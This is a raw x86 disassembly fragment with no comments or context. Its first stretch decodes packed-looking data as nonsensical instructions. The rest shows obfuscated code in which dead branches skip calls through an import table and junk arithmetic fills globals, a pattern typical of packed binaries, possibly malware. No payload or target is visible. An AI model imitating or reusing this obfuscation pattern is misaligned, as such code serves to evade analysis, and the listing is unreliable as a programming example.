  41f089:	jns    0x41f0da
  41f08b:	push   eax
  41f08c:	push   ebx
  41f08d:	hlt    
  41f08e:	cwde   
  41f08f:	(bad)  
  41f090:	or     al,0x26
  41f092:	or     ebx,DWORD PTR [ecx+eax*4]
  41f095:	loope  0x41f057
  41f097:	mov    al,BYTE PTR ds:0x75e5fe9f
  41f09d:	add    bh,ah
  41f09f:	dec    eax
  41f0a0:	ret    
  41f0a1:	sub    BYTE PTR [edi+0x22],bl
  41f0a4:	in     eax,0xda
  41f0a6:	rol    DWORD PTR [ebx],cl
  41f0a8:	or     bh,al
  41f0aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0ab:	xor    ebp,DWORD PTR [eax]
  41f0ad:	test   eax,0xb05211e6
  41f0b2:	outs   dx,DWORD PTR ds:[esi]
  41f0b3:	and    eax,0x10b127f1
  41f0b8:	cwde   
  41f0b9:	icebp  
  41f0ba:	mov    ch,0x99
  41f0bc:	jg     0x41f066
  41f0be:	pusha  
  41f0bf:	inc    esp
  41f0c0:	cmp    edx,edi
  41f0c2:	mov    ch,0xec
  41f0c4:	add    BYTE PTR [ecx+0x151eb7ec],0x54
  41f0cb:	and    edi,esp
  41f0cd:	sbb    al,0xdd
  41f0cf:	sub    eax,0x81143712
  41f0d4:	int    0x21
  41f0d6:	sbb    BYTE PTR [ecx],al
  41f0d8:	and    DWORD PTR [ebp+0x4f],edx
  41f0db:	mov    ds:0xfb8336cb,al
  41f0e0:	mov    eax,0x3034af41
  41f0e5:	mov    ds:0x93dd48f1,eax
  41f0ea:	sti    
  41f0eb:	mov    ecx,0x28739d3b
  41f0f0:	jne    0x41f0d7
  41f0f2:	rcl    DWORD PTR [ecx+ecx*2+0x35dd89a7],cl
  41f0f9:	out    dx,al
  41f0fa:	cwde   
  41f0fb:	mov    al,ds:0x5a04a198
  41f100:	je     0x41f0b6
  41f102:	mov    dl,0xdb
  41f104:	and    DWORD PTR ds:0x741ae5c1,0xffffffe7
  41f10b:	cli    
  41f10c:	and    ah,bh
  41f10e:	ja     0x41f166
  41f110:	push   0x8dee2579
  41f115:	cs mov esi,0xd4b6fa8d
  41f11b:	mov    WORD PTR ss:[esi+0x386ec118],cs
  41f122:	lds    edi,FWORD PTR [esi-0x3a046821]
  41f128:	into   
  41f129:	inc    edx
  41f12a:	out    dx,al
  41f12b:	cdq    
  41f12c:	xchg   esi,eax
  41f12d:	add    BYTE PTR [edi+ebp*4-0x17],bl
  41f131:	out    dx,eax
  41f132:	pop    ds
  41f133:	shr    BYTE PTR [ecx],cl
  41f135:	adc    DWORD PTR [ebx+0x16a5d106],edx
  41f13b:	sub    esi,DWORD PTR [ebx+0x15559805]
  41f141:	ficomp WORD PTR [edx-0x4bab101a]
  41f147:	adc    BYTE PTR [eax+0x1b4d2d15],ch
  41f14d:	fwait
  41f14e:	stc    
  41f14f:	scas   eax,DWORD PTR es:[edi]
  41f150:	test   BYTE PTR [eax],0x9c
  41f153:	ror    BYTE PTR [ebx+0x75],0xca
  41f157:	xchg   edx,ebp
  41f159:	jo     0x41f12d
  41f15b:	dec    edx
  41f15c:	push   ebp
  41f15d:	push   0xffffffcc
  41f15f:	mov    al,ds:0x646afc18
  41f164:	repnz pushf 
  41f166:	outs   dx,DWORD PTR ds:[esi]
  41f167:	aad    0x9c
  41f169:	xchg   edi,eax
  41f16a:	dec    ebp
  41f16b:	xor    edi,edx
  41f16d:	mul    DWORD PTR [eax-0x14]
  41f170:	leave  
  41f171:	pop    ecx
  41f172:	call   0xcc61:0x766b6f9b
  41f179:	cld    
  41f17a:	into   
  41f17b:	inc    ebp
  41f17c:	push   ss
  41f17d:	add    esp,ebp
  41f17f:	xchg   ecx,eax
  41f180:	jmp    0xfa80d346
  41f185:	dec    ebx
  41f186:	daa    
  41f187:	jns    0x41f1a8
  41f189:	push   cs
  41f18a:	add    esp,DWORD PTR [ebx]
  41f18c:	hlt    
  41f18d:	loop   0x41f1bc
  41f18f:	push   es
  41f190:	pop    ecx
  41f191:	sbb    ecx,DWORD PTR [esi]
  41f193:	inc    ebp
  41f194:	add    eax,DWORD PTR [edx+esi*8]
  41f197:	inc    ebx
  41f198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f199:	or     BYTE PTR [ebx-0x5a],dh
  41f19c:	mov    ecx,0xdf884e73
  41f1a1:	es push ebp
  41f1a3:	dec    esi
  41f1a4:	mov    ds:0xa3e14431,eax
  41f1a9:	cli    
  41f1aa:	div    BYTE PTR ds:0xd8cf4b09
  41f1b0:	mov    eax,ds:0x69cdbf02
  41f1b5:	sti    
  41f1b6:	retf   
  41f1b7:	es int 0x4c
  41f1ba:	pop    eax
  41f1bb:	ds ret 0xc4ca
  41f1bf:	test   eax,0x448baba7
  41f1c4:	adc    esp,ebp
  41f1c6:	movnti DWORD PTR ds:0x5156221d,esi
  41f1cd:	sub    eax,0x9fd6b2e
  41f1d2:	aam    0xd6
  41f1d4:	icebp  
  41f1d5:	push   ebp
  41f1d6:	xchg   ah,bh
  41f1d8:	dec    ebp
  41f1d9:	es inc ecx
  41f1db:	cld    
  41f1dc:	push   eax
  41f1dd:	sub    eax,0xd1b6e699
  41f1e2:	mov    bl,0xea
  41f1e4:	sar    dl,1
  41f1e6:	xchg   edx,eax
  41f1e7:	sbb    eax,DWORD PTR [esi+0x54]
  41f1ea:	mov    DWORD PTR [eax],ebx
  41f1ec:	int    0xca
  41f1ee:	clc    
  41f1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1f0:	xchg   esi,eax
  41f1f1:	stos   BYTE PTR es:[edi],al
  41f1f2:	cmp    eax,DWORD PTR [ebx+0x584ca07f]
  41f1f8:	pop    ebx
  41f1f9:	jmp    0xd5fe90a8
  41f1fe:	or     ebx,DWORD PTR [ecx]
  41f200:	and    dl,BYTE PTR [esi]
  41f202:	popf   
  41f203:	sar    DWORD PTR [ebp+0x2b],1
  41f206:	clts   
  41f208:	xchg   ecx,eax
  41f209:	outs   dx,DWORD PTR ds:[esi]
  41f20a:	add    DWORD PTR [edx-0x74f8d49],edi
  41f210:	add    al,0xc
  41f212:	push   edx
  41f213:	dec    edx
  41f214:	int3   
  41f215:	inc    esp
  41f216:	scas   eax,DWORD PTR es:[edi]
  41f217:	sbb    BYTE PTR [edi],bh
  41f219:	mov    ds:0x2a5bbd07,eax
  41f21e:	push   eax
  41f21f:	inc    ebp
  41f220:	cmp    cl,BYTE PTR [ebp-0x62]
  41f223:	add    DWORD PTR [ecx],0xffffffdc
  41f226:	and    ecx,DWORD PTR [ebp+0x4ff1c202]
  41f22c:	cli    
  41f22d:	out    dx,eax
  41f22e:	arpl   WORD PTR [eax-0x3696ccff],si
  41f234:	pop    edi
  41f235:	sbb    DWORD PTR [edx+ecx*1],esi
  41f238:	xor    DWORD PTR [esi-0xd],eax
  41f23b:	xchg   BYTE PTR [ecx-0x67bdf54d],dl
  41f241:	sbb    cl,BYTE PTR [edi+0x2f90d28e]
  41f247:	int3   
  41f248:	dec    esi
  41f249:	fs mov dl,0xce
  41f24c:	mov    bl,0x90
  41f24e:	jp     0x41f220
  41f250:	push   ebp
  41f251:	sbb    BYTE PTR [eax+edi*8+0x5e086583],dh
  41f258:	outs   dx,BYTE PTR ds:[esi]
  41f259:	repnz cmp eax,0xd0a0f4f9
  41f25f:	pop    ebp
  41f260:	scas   al,BYTE PTR es:[edi]
  41f261:	cmp    al,0x47
  41f263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f264:	aas    
  41f265:	jmp    0x41f23c
  41f267:	push   edx
  41f268:	scas   al,BYTE PTR es:[edi]
  41f269:	xchg   ebp,eax
  41f26a:	dec    edi
  41f26b:	arpl   WORD PTR [ebp+0x77],ax
  41f26e:	sub    eax,0x339974b8
  41f273:	xor    ah,dh
  41f275:	xor    al,BYTE PTR [ebx+0x57]
  41f278:	shl    BYTE PTR [esi+ebx*8+0x5d],1
  41f27c:	mov    WORD PTR [ebx+0x16],gs
  41f27f:	clc    
  41f280:	sub    esp,eax
  41f282:	mov    ecx,0xef9217e1
  41f287:	jecxz  0x41f2cf
  41f289:	jno    0x41f2b9
  41f28b:	mov    BYTE PTR [ecx-0x184626fc],bl
  41f291:	mov    ebx,0x6e492ec6
  41f296:	stos   BYTE PTR es:[edi],al
  41f297:	out    0x4b,al
  41f299:	mov    dl,0x97
  41f29b:	(bad)  
  41f29c:	mov    cl,0x21
  41f29e:	sbb    ebp,ecx
  41f2a0:	cli    
  41f2a1:	outs   dx,DWORD PTR ds:[esi]
  41f2a2:	xchg   esi,eax
  41f2a3:	popf   
  41f2a4:	xchg   cl,ch
  41f2a6:	push   edi
  41f2a7:	nop
  41f2a8:	jb     0x41f2be
  41f2aa:	mov    BYTE PTR [ecx],cl
  41f2ac:	pushf  
  41f2ad:	inc    edi
  41f2ae:	pop    edx
  41f2af:	mov    eax,ds:0xe70af049
  41f2b4:	pushf  
  41f2b5:	neg    edx
  41f2b7:	pop    esp
  41f2b8:	retf   
  41f2b9:	pusha  
  41f2ba:	mov    eax,ds:0x821bb323
  41f2bf:	cmp    dl,al
  41f2c1:	mov    ecx,0x5e0100d2
  41f2c6:	pop    es
  41f2c7:	push   edx
  41f2c8:	mov    ebp,0xe20620d6
  41f2cd:	ret    0x4f4e
  41f2d0:	add    dh,bl
  41f2d2:	(bad)  ds:0xdab5896c
  41f2d8:	inc    esi
  41f2d9:	data16 cmp dh,BYTE PTR [edi+ecx*8+0x35]
  41f2de:	push   edx
  41f2df:	and    edi,esp
  41f2e1:	loopne 0x41f2e9
  41f2e3:	sub    ah,BYTE PTR [esi+0x15]
  41f2e6:	pop    ss
  41f2e7:	mov    BYTE PTR [ecx+0x56],ah
  41f2ea:	cwde   
  41f2eb:	sub    esi,ecx
  41f2ed:	or     eax,0xad88ce99
  41f2f2:	arpl   WORD PTR [esi-0x72705c46],cx
  41f2f8:	push   edi
  41f2f9:	pop    edi
  41f2fa:	retf   
  41f2fb:	jnp    0x41f33f
  41f2fd:	leave  
  41f2fe:	fidiv  WORD PTR ds:0xcda4042b
  41f304:	and    eax,0xb7c64013
  41f309:	cmp    DWORD PTR [ecx],esp
  41f30b:	sbb    ebp,edx
  41f30d:	in     al,dx
  41f30e:	frstor [ecx]
  41f310:	out    dx,eax
  41f311:	test   dh,ah
  41f313:	sbb    ebp,DWORD PTR ds:0x11b2f0fc
  41f319:	add    edi,0x1d
  41f31c:	ds rol ebx,0xa4
  41f320:	push   ebp
  41f321:	in     eax,dx
  41f322:	sub    eax,0x3599a21f
  41f327:	pushf  
  41f328:	(bad)  
  41f329:	pop    edx
  41f32a:	scas   eax,DWORD PTR es:[edi]
  41f32b:	retf   0xc7f3
  41f32e:	repz cmp eax,0xf3a809a
  41f334:	inc    edi
  41f335:	mov    DWORD PTR [eax-0x4f78144b],ebp
  41f33b:	int    0x2c
  41f33d:	push   edi
  41f33e:	cli    
  41f33f:	dec    edx
  41f340:	cmp    eax,0x680d60d3
  41f345:	std    
  41f346:	push   ss
  41f347:	out    dx,al
  41f348:	lods   eax,DWORD PTR ds:[si]
  41f34a:	adc    esp,esp
  41f34c:	leave  
  41f34d:	jmp    0x41f3b2
  41f34f:	xchg   DWORD PTR [ebx],esi
  41f351:	maxps  xmm7,XMMWORD PTR [eax+0x3d]
  41f355:	(bad)  
  41f356:	idiv   DWORD PTR [edx-0x3]
  41f359:	sub    edi,DWORD PTR [esi+edi*4+0x2e718d14]
  41f360:	jmp    0x41f395
  41f362:	mov    ds:0xc9417168,al
  41f367:	pop    edi
  41f368:	add    eax,0x899045c7
  41f36d:	outs   dx,DWORD PTR ds:[esi]
  41f36e:	add    BYTE PTR [eax],al
  41f370:	cmp    DWORD PTR ds:0x428313,0x0
  41f377:	movzx  edx,WORD PTR ds:0x42822f
  41f37e:	mov    ecx,DWORD PTR ds:0x428277
  41f384:	mov    ecx,DWORD PTR ds:0x428263
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42824f,ebx
  41f397:	cmp    DWORD PTR ds:0x428313,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x428123
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428e20
  41f3c7:	sub    ecx,DWORD PTR ds:0x428247
  41f3cd:	mov    DWORD PTR ds:0x428197,0x2f55
  41f3d7:	and    DWORD PTR ds:0x4282f3,ebx
  41f3dd:	or     DWORD PTR ds:0x42830b,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x42819f
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x428327,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x42817f,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x42838b,0x0
  41f428:	mov    DWORD PTR ds:0x42831f,0xae0
  41f432:	mov    DWORD PTR ds:0x42815b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x42837b
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x428303,ebx
  41f449:	mov    DWORD PTR ds:0x42817f,0x2430
  41f453:	cmp    DWORD PTR ds:0x42838b,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427f35
  41f468:	call   DWORD PTR ds:0x428ea4
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x428397
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x428197,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x4282ef,0x6486
  41f49d:	mov    DWORD PTR ds:0x42825b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x42828b,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x428393,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x428197,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x427ffb
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428e24
  41f4d7:	neg    DWORD PTR ds:0x42818b
  41f4dd:	and    DWORD PTR ds:0x42826f,0x4282f3
  41f4e7:	and    DWORD PTR ds:0x42836f,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x428187
  41f4f4:	sbb    edx,DWORD PTR ds:0x42830f
  41f4fa:	mov    DWORD PTR ds:0x428187,edx
  41f500:	sub    DWORD PTR ds:0x428283,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x42818f,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x428393,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x428173,0x0
  41f53b:	mov    DWORD PTR ds:0x42838f,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42824f,0x6044
  41f55b:	not    DWORD PTR ds:0x42825b
  41f561:	cmp    DWORD PTR ds:0x428173,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428e28
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428153,edi
  41f5a3:	and    DWORD PTR ds:0x4282eb,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x428303
  41f5b0:	add    edx,DWORD PTR ds:0x4282fb
  41f5b6:	mov    DWORD PTR ds:0x428303,edx
  41f5bc:	add    DWORD PTR ds:0x4282f7,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42825b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x42838f,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x42819b,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x42831f,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x42830f,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x428393,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428257,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x42826b,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x428287,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428253
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x42829f,0x35b0
  41f651:	cmp    DWORD PTR ds:0x42826b,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428e2c
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x42822b,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x4282f7
  41f67a:	add    DWORD PTR ds:0x42831b,ecx
  41f680:	sbb    DWORD PTR ds:0x42828f,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x428163
  41f68c:	adc    DWORD PTR ds:0x428157,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x4283bf
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42824f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x428323,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x428307,0x0
  41f6e5:	mov    DWORD PTR ds:0x42830f,0x6375
  41f6ef:	not    DWORD PTR ds:0x42816f
  41f6f5:	mov    DWORD PTR ds:0x42822b,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x42823b,0x2351
  41f70a:	mov    DWORD PTR ds:0x42827f,ebx
  41f710:	cmp    DWORD PTR ds:0x428307,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x42826b
  41f727:	call   DWORD PTR ds:0x428e30
  41f72d:	movzx  ecx,WORD PTR ds:0x42823b
  41f734:	xor    DWORD PTR ds:0x4283a7,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x42826b
  41f740:	add    ecx,DWORD PTR ds:0x428263
  41f746:	mov    DWORD PTR ds:0x42826b,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x42827b
  41f752:	adc    DWORD PTR ds:0x42838b,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x428327,ebx
  41f75f:	sub    DWORD PTR ds:0x428187,edx
  41f765:	and    DWORD PTR ds:0x428307,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x42831b,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x428387,0x4282fb
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x428237,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428247
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x42823b,0x428197
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x428387,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x428287
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x428393,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x428377
  41f7d9:	mov    DWORD PTR ds:0x42836b,ecx
  41f7df:	mov    DWORD PTR ds:0x42830f,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x42828f,0xe1
  41f7f8:	mov    DWORD PTR ds:0x428187,edi
  41f7fe:	cmp    DWORD PTR ds:0x428393,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427f7a
  41f813:	push   0x427ee1
  41f818:	call   DWORD PTR ds:0x428ea8
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x4283bb
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x428277,ecx
  41f830:	adc    DWORD PTR ds:0x42815f,edi
  41f836:	and    DWORD PTR ds:0x42839f,0x3101
  41f840:	mov    DWORD PTR ds:0x4283a7,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x42816f,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42825f
  41f857:	mov    DWORD PTR ds:0x42824b,0x4504
  41f861:	mov    DWORD PTR ds:0x42837f,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x4283a3
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x42830f,ebx
  41f87c:	cmp    DWORD PTR ds:0x42816f,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427fac
  41f890:	push   0x427fb6
  41f895:	call   DWORD PTR ds:0x428eac
  41f89b:	and    DWORD PTR ds:0x428187,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x42830f,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x4283a3
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x428177,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x428267,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x42837b,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x428163,0x42839f
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x428277
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x42822f
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x4282f3,0x0
  41f93e:	mov    DWORD PTR ds:0x428303,0x63c0
  41f948:	mov    DWORD PTR ds:0x428193,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x42829f
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x4282f3,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428eb0
  41f979:	sbb    DWORD PTR ds:0x4283a3,0x209
  41f983:	xor    DWORD PTR ds:0x428393,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x42828f,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x428193
  41f9bf:	or     DWORD PTR ds:0x42837f,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x4282f7,0x0
  41f9d1:	mov    DWORD PTR ds:0x42823b,0x756d
  41f9db:	mov    DWORD PTR ds:0x4282f3,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x4282fb
  41f9f0:	cmp    DWORD PTR ds:0x4282f7,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428e34
  41fa08:	adc    DWORD PTR ds:0x42838f,ebx
  41fa0e:	sbb    DWORD PTR ds:0x428313,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x42836b
  41fa1b:	add    DWORD PTR ds:0x42837b,ecx
  41fa21:	add    DWORD PTR ds:0x428373,0x77eb
  41fa2b:	or     DWORD PTR ds:0x4282f3,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x42829f
  41fa3b:	and    DWORD PTR ds:0x42815f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42824b,0x42818b
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x428293,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x428277,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x428307,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x428197
  41fa8d:	mov    DWORD PTR ds:0x42818f,0x4079
  41fa97:	cmp    DWORD PTR ds:0x428277,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x428083
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428e38
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428153
  41fabc:	sbb    ecx,DWORD PTR ds:0x42824b
  41fac2:	mov    DWORD PTR ds:0x428153,ecx
  41fac8:	xor    DWORD PTR ds:0x42829b,edx
  41face:	movzx  ecx,WORD PTR ds:0x428253
  41fad5:	or     DWORD PTR ds:0x4282eb,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x42837b
  41fae3:	add    DWORD PTR ds:0x42828f,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x42816b
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x42819b,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x4282ff
  41fb06:	mov    DWORD PTR ds:0x428383,edx
  41fb0c:	mov    DWORD PTR ds:0x42815f,ebx
  41fb12:	mov    DWORD PTR ds:0x428307,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x42819b,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428e3c
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x4283a3
  41fb48:	or     ecx,DWORD PTR ds:0x428273
  41fb4e:	mov    DWORD PTR ds:0x4283a3,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x42816b
  41fb5a:	add    ecx,DWORD PTR ds:0x4283a3
  41fb60:	mov    DWORD PTR ds:0x42816b,ecx
  41fb66:	sbb    DWORD PTR ds:0x42828b,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x42829f
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42824f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428257,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x42818f,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x428287,0x42828b
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x42839b,0x428303
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x42836f,0x0
  41fbc2:	mov    DWORD PTR ds:0x42819b,ebx
  41fbc8:	mov    DWORD PTR ds:0x4283a7,0x6142
  41fbd2:	jmp    0x41fc37
